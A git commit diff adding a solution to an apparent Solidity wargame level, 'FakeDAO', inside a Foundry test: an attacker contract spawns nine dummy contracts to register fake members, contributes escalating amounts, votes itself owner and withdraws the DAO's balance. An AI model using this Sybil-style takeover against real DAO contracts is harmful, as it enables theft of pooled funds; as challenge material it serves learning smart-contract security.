717c3e2bc488ed48c368c77294b583c67077d8a5
Lapo4kaKek <Sheydos2003@yandex.ru>
2024-10-25 20:50:29 +0000

    feat: added solution for FakeDao

--- test/10_FakeDAO.t.sol
+++ test/10_FakeDAO.t.sol
@@ -4,6 +4,7 @@ pragma solidity ^0.8.25;
 import "./BaseTest.t.sol";
 import "src/10_FakeDAO/FakeDAO.sol";
 
+
 // forge test --match-contract FakeDAOTest -vvvv
 contract FakeDAOTest is BaseTest {
     FakeDAO instance;
@@ -11,12 +12,12 @@ contract FakeDAOTest is BaseTest {
     function setUp() public override {
         super.setUp();
 
-        instance = new FakeDAO{value: 0.01 ether}(address(0xDeAdBeEf));
+        instance = new FakeDAO{value: 0.01 ether}(address(0x1));
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
-
+        DAOAttacker attacker = new DAOAttacker(instance);
+        attacker.executeAttack{value: 10 ether}();
         checkSuccess();
     }
 
@@ -24,4 +25,39 @@ contract FakeDAOTest is BaseTest {
         assertTrue(instance.owner() != owner, "Solution is not solving the level");
         assertTrue(address(instance).balance == 0, "Solution is not solving the level");
     }
+}
+
+contract DummyUser {
+    constructor(FakeDAO daoContract) {
+        daoContract.register();
+    }
+}
+
+contract DAOAttacker {
+    FakeDAO public daoInstance;
+
+    constructor(FakeDAO _daoInstance) {
+        daoInstance = _daoInstance;
+    }
+
+    function executeAttack() external payable {
+        for (uint i = 1; i <= 9; i++) {
+            new DummyUser(daoInstance);
+        }
+
+        daoInstance.register();
+
+        uint256 value = 0.02 ether;
+        
+        for (uint256 i = 0; i < 9; i++) {
+            daoInstance.contribute{value: value}();
+            value += 0.01 ether;
+        }
+
+        daoInstance.voteForYourself();
+
+        daoInstance.withdraw();
+    }
+
+    receive() external payable {}
 }
